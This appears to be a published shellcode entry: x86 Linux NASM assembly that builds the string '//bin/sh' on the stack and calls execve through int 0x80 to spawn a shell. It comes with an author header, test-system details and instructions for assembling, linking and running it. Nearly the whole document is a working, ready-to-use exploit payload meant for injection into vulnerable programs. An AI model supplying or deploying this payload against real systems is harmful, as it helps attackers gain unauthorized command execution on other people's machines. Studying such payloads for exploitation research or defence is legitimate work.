;[+] Author: e55db081d05f58a
;[+] Title: Shellcode: Linux/x86 - /bin/sh - 26 bytes
;[+] Type:Shellcode
;[+] Tested on: 4.0.5-antix.1-486-smp i686
;[+] Twitter: @e55db081d05f58a
;=====================================================

;=====================================================
;shellcode_linux_x86_bin_sh.asm
;assemble: nasm -f elf32 -l shellcode_linux_x86_bin_sh.lst shellcode_linux_x86_bin_sh.asm
;link: gcc -o shellcode_linux_x86_bin_sh shellcode_linux_x86_bin_sh.o
;run: ./shellcode_linux_x86_bin_sh
;=====================================================
section .text
	global main
	main:
		xor eax,eax		;eax = 0
		push eax		;string ends with NULL byte
		push 0x68732f6e		;push "n/sh" in reverse i.e hs/n
		push 0x69622f2f		;push "//bi" in reverse i.e ib//
		mov ebx,esp		;ebx = argv[0] = string addr
		push eax		;argv[1]=NULL
		push ebx		;argv[0]= /bin//sh
		mov ecx,esp		;ecx = &argv[0]
		push eax 		;push 0
		mov edx,eax		;edx = envp = NULL
		mov al,11		;al = 11 = execve
		int 0x80		;execv(argv[0],argv,NULL)
	
